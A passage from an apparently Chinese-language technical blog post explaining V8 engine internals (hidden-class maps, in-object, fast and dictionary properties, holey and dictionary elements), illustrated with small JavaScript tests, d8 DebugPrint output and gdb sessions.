0x1e016e18f881 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - instance descriptors (own) #2: 0x27984250c919 &lt;FixedArray[8]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x27984250c749 &lt;Object map = 0x1e016e18f829&gt;</span><br><span class="line"> - constructor: 0x2672a3c30041 &lt;JSFunction Point (sfi = 0x2672a3c2fc91)&gt;</span><br><span class="line"> - code cache: 0x23ac56e02241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x23ac56e02241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 6</span><br><span class="line"></span><br><span class="line">DebugPrint: 0x27984250c969: [JS_OBJECT_TYPE]</span><br><span class="line"> - map = 0x1e016e18f8d9 [FastProperties]</span><br><span class="line"> - prototype = 0x27984250c749</span><br><span class="line"> - elements = 0x23ac56e02241 &lt;FixedArray[0]&gt; [FAST_HOLEY_ELEMENTS]</span><br><span class="line"> - properties = 0x23ac56e02241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #x: 12 (data field 0)</span><br><span class="line">    #y: 13 (data field 1)</span><br><span class="line"> &#125;</span><br><span class="line">0x1e016e18f8d9: [Map]</span><br><span class="line"> - type: JS_OBJECT_TYPE</span><br><span class="line"> - instance size: 104</span><br><span class="line"> - inobject properties: 10</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 8</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x1e016e18f881 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - instance descriptors (own) #2: 0x27984250c919 &lt;FixedArray[8]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x27984250c749 &lt;Object map = 0x1e016e18f931&gt;</span><br><span class="line"> - constructor: 0x2672a3c30041 &lt;JSFunction Point (sfi = 0x2672a3c2fc91)&gt;</span><br><span class="line"> - code cache: 0x23ac56e02241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x23ac56e02241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 6</span><br></pre></td></tr></table></figure><p>结论：相同的map值</p><h4 id="test2"><a href="#test2" class="headerlink" title="test2"></a>test2</h4><p>add p2.z = 14;<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-16-074842.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~/v8/v8/out.gn/x64.debug$ ./d8 --allow_natives_syntax test.js </span><br><span class="line">DebugPrint: 0x252f4f50c891: [JS_OBJECT_TYPE]</span><br><span class="line"> - map = 0x2d1249b8f8d9 [FastProperties]</span><br><span class="line"> - prototype = 0x252f4f50c761</span><br><span class="line"> - elements = 0x538c1f82241 &lt;FixedArray[0]&gt; [FAST_HOLEY_ELEMENTS]</span><br><span class="line"> - properties = 0x538c1f82241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #x: 10 (data field 0)</span><br><span class="line">    #y: 11 (data field 1)</span><br><span class="line"> &#125;</span><br><span class="line">0x2d1249b8f8d9: [Map]</span><br><span class="line"> - type: JS_OBJECT_TYPE</span><br><span class="line"> - instance size: 104</span><br><span class="line"> - inobject properties: 10</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 8</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x2d1249b8f881 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - instance descriptors (own) #2: 0x252f4f50c931 &lt;FixedArray[8]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x252f4f50c761 &lt;Object map = 0x2d1249b8f829&gt;</span><br><span class="line"> - constructor: 0x3be1e3530089 &lt;JSFunction Point (sfi = 0x3be1e352fc91)&gt;</span><br><span class="line"> - code cache: 0x538c1f82241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x538c1f82241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 6</span><br><span class="line"></span><br><span class="line">DebugPrint: 0x252f4f50c981: [JS_OBJECT_TYPE]</span><br><span class="line"> - map = 0x2d1249b8f8d9 [FastProperties]</span><br><span class="line"> - prototype = 0x252f4f50c761</span><br><span class="line"> - elements = 0x538c1f82241 &lt;FixedArray[0]&gt; [FAST_HOLEY_ELEMENTS]</span><br><span class="line"> - properties = 0x538c1f82241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #x: 12 (data field 0)</span><br><span class="line">    #y: 13 (data field 1)</span><br><span class="line"> &#125;</span><br><span class="line">0x2d1249b8f8d9: [Map]</span><br><span class="line"> - type: JS_OBJECT_TYPE</span><br><span class="line"> - instance size: 104</span><br><span class="line"> - inobject properties: 10</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 8</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x2d1249b8f881 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - instance descriptors (own) #2: 0x252f4f50c931 &lt;FixedArray[8]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x252f4f50c761 &lt;Object map = 0x2d1249b8f931&gt;</span><br><span class="line"> - constructor: 0x3be1e3530089 &lt;JSFunction Point (sfi = 0x3be1e352fc91)&gt;</span><br><span class="line"> - code cache: 0x538c1f82241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x538c1f82241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 6</span><br><span class="line"></span><br><span class="line">DebugPrint: 0x252f4f50c981: [JS_OBJECT_TYPE]</span><br><span class="line"> - map = 0x2d1249b8f989 [FastProperties]</span><br><span class="line"> - prototype = 0x252f4f50c761</span><br><span class="line"> - elements = 0x538c1f82241 &lt;FixedArray[0]&gt; [FAST_HOLEY_ELEMENTS]</span><br><span class="line"> - properties = 0x538c1f82241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #x: 12 (data field 0)</span><br><span class="line">    #y: 13 (data field 1)</span><br><span class="line">    #z: 14 (data field 2)</span><br><span class="line"> &#125;</span><br><span class="line"> 0x2d1249b8f989: [Map]</span><br><span class="line"> - type: JS_OBJECT_TYPE</span><br><span class="line"> - instance size: 104</span><br><span class="line"> - inobject properties: 10</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 7</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x2d1249b8f8d9 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - instance descriptors (own) #3: 0x252f4f50ca51 &lt;FixedArray[11]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x252f4f50c761 &lt;Object map = 0x2d1249b8f931&gt;</span><br><span class="line"> - constructor: 0x3be1e3530089 &lt;JSFunction Point (sfi = 0x3be1e352fc91)&gt;</span><br><span class="line"> - code cache: 0x538c1f82241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x538c1f82241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 6</span><br></pre></td></tr></table></figure></p><p>结论：指向一个新的map</p><h3 id="property的管理方法"><a href="#property的管理方法" class="headerlink" title="property的管理方法"></a>property的管理方法</h3><h4 id="In-Object-Properties"><a href="#In-Object-Properties" class="headerlink" title="In-Object Properties"></a>In-Object Properties</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Point</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">this</span>.x = x;</span><br><span class="line"> <span class="keyword">this</span>.y = y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> p1 = <span class="keyword">new</span> Point(<span class="number">10</span>, <span class="number">11</span>);</span><br><span class="line">%DebugPrint(p1)</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-18-144639.png" alt="">V8支持所谓的对象内属性，它们被直接保存在对象上，和对象在同一块内存区域。这种属性是V8中速度最快的属性，能够被直接访问。对象内属性的个数由对象初始化大小决定。如果要添加的属性超出对象的大小，这些属性就会被放入properties store中。properties store会增加一层属性访问的消耗，但是不受大小的限制。 </p><h4 id="Fast-Properties"><a href="#Fast-Properties" class="headerlink" title="Fast Properties"></a>Fast Properties</h4><p>一般来说，我们会把属性保存在线性的properties store中，作为快速属性。快速属性可以通过简单的索引在properties store中访问。不过为了从属性名从properties store获取实际位置，我们要去HiddenClass上的 descriptor array中查询 。具体来讲，这一步骤是先根据属性名搜寻隐藏类的descriptor array，然后得到到数组的偏移地址，然后根据偏移地址到properties store上读取属性信息。实际上，第一次查找属性的时候难免会经历一次隐藏类的哈希查找，但下次一般会结合内联缓存，直接采用缓存的位移来存取属性。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-16-080119.jpg" alt=""></p><h4 id="Slow-Properties"><a href="#Slow-Properties" class="headerlink" title="Slow Properties"></a>Slow Properties</h4><p>  然而，若是有很多属性从对象上添加或者删除，就需要花费很多时间和内存来维护descriptor array以及隐藏类。因此，V8也支持所谓的慢属性。拥有慢属性的对象会拥有一个自给的字典作为它的properties store（如上图所示）。这种情况下，所有属性的元信息不再储存在隐藏类的descriptor array中，而是直接保存在属性字典上。因此，此时属性的添加和移除不用再去更新指向的隐藏类。因为内联缓存不适用保存在字典中的属性，所以慢属性一般要比快属性慢。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-16-080209.jpg" alt=""></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>列表内容有三种不同类型的命名属性：对象内属性，快属性，以及慢/字典属性。<br>  1. 对象内属性直接储存在对象自身上，提供最快的属性访问。<br>  2. 快属性活跃在properties store上，所有相关的元信息都在隐藏类的descriptor array中。<br>  3. 慢属性保存在一个自给的属性字典上，属性的元信息不再与隐藏类有关。<br>慢属性提供高效的属性添加删除，但是访问速度要慢于快速属性和对象内对象。</p><h2 id="Elements-or-array-indexed-Properties"><a href="#Elements-or-array-indexed-Properties" class="headerlink" title="Elements or array-indexed Properties"></a>Elements or array-indexed Properties</h2><p>  目前为止我们介绍了命名属性并且忽略了通常出现在数组中的整数索引属性。处理这种整数型属性要比命名属性简单很多。<br>所有的整数型属性都被单独保存在一个elements store中，并且有多达20种元素类型。</p><h3 id="Packed-or-Holey-Elements"><a href="#Packed-or-Holey-Elements" class="headerlink" title="Packed or Holey Elements"></a>Packed or Holey Elements</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> o = [<span class="string">"a"</span>, <span class="string">"b"</span>, <span class="string">"c"</span>];</span><br><span class="line">print(o[<span class="number">1</span>]);          <span class="comment">// Prints "b".</span></span><br><span class="line">%DebugPrint(o)</span><br><span class="line"><span class="keyword">delete</span> o[<span class="number">1</span>];                <span class="comment">// Introduces a hole in the elements store.</span></span><br><span class="line">%DebugPrint(o)</span><br><span class="line">print(o[<span class="number">1</span>]);          <span class="comment">// Prints "undefined"; property 1 does not exist.</span></span><br><span class="line">o.__proto__ = &#123;<span class="number">1</span>: <span class="string">"B"</span>&#125;;     <span class="comment">// Define property 1 on the prototype.</span></span><br><span class="line">%DebugPrint(o)</span><br><span class="line">print(o[<span class="number">0</span>]);          <span class="comment">// Prints "a".</span></span><br><span class="line">print(o[<span class="number">1</span>]);          <span class="comment">// Prints "B".</span></span><br><span class="line">print(o[<span class="number">2</span>]);          <span class="comment">// Prints "c".</span></span><br><span class="line">print(o[<span class="number">3</span>]);          <span class="comment">// Prints undefined</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">parallels@ubuntu:~/v8/v8/out.gn/x64.debug$ ./d8 --allow_natives_syntax test.js </span><br><span class="line">b</span><br><span class="line">DebugPrint: 0xf279b90c8e9: [JSArray]</span><br><span class="line"> - map = 0x236e9503b71 [FastProperties]</span><br><span class="line"> - prototype = 0x92dae107f51</span><br><span class="line"> - elements = 0xf279b90c861 &lt;FixedArray[3]&gt; [FAST_ELEMENTS (COW)]</span><br><span class="line"> - length = 3</span><br><span class="line"> - properties = 0x31013b402241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x37e7c51b6b51 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements = 0xf279b90c861 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 0x31013b408171 &lt;String[1]: a&gt;</span><br><span class="line">           1: 0x31013b408191 &lt;String[1]: b&gt;</span><br><span class="line">           2: 0x31013b4081b1 &lt;String[1]: c&gt;</span><br><span class="line"> &#125;</span><br><span class="line">0x236e9503b71: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: FAST_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: 0x236e9503d29 &lt;Map(FAST_HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line"> - instance descriptors #1: 0x92dae108a11 &lt;FixedArray[5]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - transitions #1: 0x92dae108a81 &lt;TransitionArray[5]&gt;</span><br><span class="line">     0x31013b404069 &lt;Symbol: elements_transition_symbol&gt;: (transition to FAST_HOLEY_ELEMENTS) -&gt; 0x236e9503e31 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - prototype: 0x92dae107f51 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x92dae107f71 &lt;JSFunction Array (sfi = 0x31013b43d6c1)&gt;</span><br><span class="line"> - code cache: 0x31013b402241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x31013b402241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"></span><br><span class="line">DebugPrint: 0xf279b90c8e9: [JSArray]</span><br><span class="line"> - map = 0x236e9503e31 [FastProperties]</span><br><span class="line"> - prototype = 0x92dae107f51</span><br><span class="line"> - elements = 0xf279b90c919 &lt;FixedArray[3]&gt; [FAST_HOLEY_ELEMENTS]</span><br><span class="line"> - length = 3</span><br><span class="line"> - properties = 0x31013b402241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x37e7c51b6b51 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements = 0xf279b90c919 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 0x31013b408171 &lt;String[1]: a&gt;</span><br><span class="line">           1: 0x31013b402351 &lt;the_hole&gt;</span><br><span class="line">           2: 0x31013b4081b1 &lt;String[1]: c&gt;</span><br><span class="line"> &#125;</span><br><span class="line">0x236e9503e31: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x236e9503b71 &lt;Map(FAST_ELEMENTS)&gt;</span><br><span class="line"> - instance descriptors (own) #1: 0x92dae108a11 &lt;FixedArray[5]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x92dae107f51 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x92dae107f71 &lt;JSFunction Array (sfi = 0x31013b43d6c1)&gt;</span><br><span class="line"> - code cache: 0x31013b402241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x31013b402241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"></span><br><span class="line">undefined</span><br><span class="line">DebugPrint: 0xf279b90c8e9: [JSArray]</span><br><span class="line"> - map = 0x236e950f779 [FastProperties]</span><br><span class="line"> - prototype = 0xf279b90c9e9</span><br><span class="line"> - elements = 0xf279b90c919 &lt;FixedArray[3]&gt; [FAST_HOLEY_ELEMENTS]</span><br><span class="line"> - length = 3</span><br><span class="line"> - properties = 0x31013b402241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x37e7c51b6b51 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements = 0xf279b90c919 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 0x31013b408171 &lt;String[1]: a&gt;</span><br><span class="line">           1: 0x31013b402351 &lt;the_hole&gt;</span><br><span class="line">           2: 0x31013b4081b1 &lt;String[1]: c&gt;</span><br><span class="line"> &#125;</span><br><span class="line">0x236e950f779: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x31013b402311 &lt;undefined&gt;</span><br><span class="line"> - instance descriptors (own) #1: 0xf279b90cad9 &lt;FixedArray[5]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0xf279b90c9e9 &lt;Object map = 0x236e950f7d1&gt;</span><br><span class="line"> - constructor: 0x92dae107f71 &lt;JSFunction Array (sfi = 0x31013b43d6c1)&gt;</span><br><span class="line"> - code cache: 0x31013b402241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x31013b402241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"></span><br><span class="line">a</span><br><span class="line">B</span><br><span class="line">c</span><br><span class="line">undefined</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-16-082449.jpg" alt=""><br>  简言之，如果属性在接收者上找不到（接受者可以理解为要访问的属性或者方法指向的那个对象），那么就会继续到原型链上找。<br>这些元素是自给自足的，换言之，我们不需要在隐藏类上储存这些索引属性。另外，我们需要一个特殊的值，称之为空洞，来标记那些不存在属性。这点对于数组方法的性能很关键。<br>若是我们知道elements store没有空洞，是被填满的，我们可以提高本地操作（指无需原型链参与）的性能，不需要再去花费昂贵的代价查找原型链。</p><h3 id="Fast-or-Dictionary-Elements"><a href="#Fast-or-Dictionary-Elements" class="headerlink" title="Fast or Dictionary Elements"></a>Fast or Dictionary Elements</h3><p>  第二个关于元素的主要的区分为是否是快速或是字典模式。快速元素就是VM内部简单的将数组索引与elements store中的索引映射。<br>然而，这种简单表示，在那种有很大的空洞以及很少位置被占用的数组上是相当浪费的。在这种情况下，我们将转换成字典模式，这会减小内存但轻微的牺牲性能。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sparseArray = [];</span><br><span class="line">sparseArray[<span class="number">9999</span>] = <span class="string">"foo"</span>; <span class="comment">// Creates an array with dictionary elements.</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ r --allow_natives_syntax test.js </span><br><span class="line">Starting program: /home/parallels/v8/v8/out.gn/x64.debug/d8 --allow_natives_syntax test.js</span><br><span class="line">DebugPrint: 0x6ed6db8c769: [JSArray]</span><br><span class="line"> - map = 0x16a58d0f779 [FastProperties]</span><br><span class="line"> - prototype = 0x37db83507f51</span><br><span class="line"> - elements = 0x6ed6db8c799 &lt;FixedArray[17]&gt; [DICTIONARY_ELEMENTS]</span><br><span class="line"> - length = 10000</span><br><span class="line"> - properties = 0x38a1eb682241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x3529df1b6b51 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements = 0x6ed6db8c799 &lt;FixedArray[17]&gt; &#123;</span><br><span class="line">   9999: 0x37db8352faa9 &lt;String[3]: foo&gt; (data, dict_index: 0, attrs: [WEC])</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-18-145330.png" alt=""><br>0x270F=9999</p><p>  在这个例子中，如果给这个数组分配完整的10k个空间将会造成极大浪费。而实际上V8是创建了一个key-value-descriptor的triplets。这个例子中的key是“9999”，value是“foo”，而descriptor是使用的默认值。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> array = [];</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(array, <span class="number">0</span>, &#123;<span class="attr">value</span>: <span class="string">"fixed"</span>, <span class="attr">configurable</span>: <span class="literal">false</span>&#125;);</span><br><span class="line">%DebugPrint(array)</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ r --allow_natives_syntax test.js </span><br><span class="line">Starting program: /home/parallels/v8/v8/out.gn/x64.debug/d8 --allow_natives_syntax test.js</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span><br><span class="line">[New Thread 0x7ffff43f1700 (LWP 18068)]</span><br><span class="line">DebugPrint: 0x28f5f190c759: [JSArray]</span><br><span class="line"> - map = 0x1e39b868f881 [FastProperties]</span><br><span class="line"> - prototype = 0x61172b07f51</span><br><span class="line"> - elements = 0x28f5f190c849 &lt;FixedArray[17]&gt; [DICTIONARY_ELEMENTS]</span><br><span class="line"> - length = 1</span><br><span class="line"> - properties = 0x3c90a5102241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x2a07bddb6b51 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements = 0x28f5f190c849 &lt;FixedArray[17]&gt; &#123;</span><br><span class="line">   0: 0x3c90a5111569 &lt;String[5]: fixed&gt; (data, dict_index: 0, attrs: [___])</span><br><span class="line"> &#125;</span><br><span class="line">0x1e39b868f881: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: DICTIONARY_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x1e39b8683e31 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - instance descriptors (own) #1: 0x61172b08a11 &lt;FixedArray[5]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x61172b07f51 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x61172b07f71 &lt;JSFunction Array (sfi = 0x3c90a513d6c1)&gt;</span><br><span class="line"> - code cache: 0x3c90a5102241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x3c90a5102241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 0</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-16-084456.png" alt=""><br>  在上面例子中，我们给数组添加了一个non-configurable属性。这个信息就会被保存慢元素字典的triplet中的descriptor 部分。需要切记一点，数组方法在那些拥有慢元素的对象上的性能会相当慢。</p><h3 id="The-ElementsAccessor"><a href="#The-ElementsAccessor" class="headerlink" title="The ElementsAccessor"></a>The 